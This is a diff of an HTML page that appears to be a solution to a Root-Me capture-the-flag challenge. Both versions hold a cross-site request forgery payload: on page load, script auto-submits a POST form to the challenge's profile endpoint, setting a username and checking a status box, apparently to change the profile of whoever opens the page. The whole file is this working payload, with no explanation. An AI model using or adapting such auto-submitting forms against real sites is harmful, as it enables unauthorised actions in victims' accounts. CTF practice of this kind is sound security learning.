@@ -1,17 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <script>
-        // This will trigger the form submission when the page loads
-        window.onload = function() {
-            document.getElementById("autoSubmitForm").submit();
-        };
-    </script>
+<script>
+function autoload() {document.getElementById("form1").submit()}
+</script>
 </head>
-<body>
-    <form id="autoSubmitForm" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
-        <input type="text" name="username" value="h3ll0">
-        <input type="checkbox" name="status" value="on" checked>
-    </form>
+<body onload="autoload()">
+<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" id="form1" method="post" enctype="multipart/form-data">
+<input type="text" name="username" value="h3ll0">
+<input type="checkbox" name="status" value="on" checked>
+</form>
 </body>
 </html>
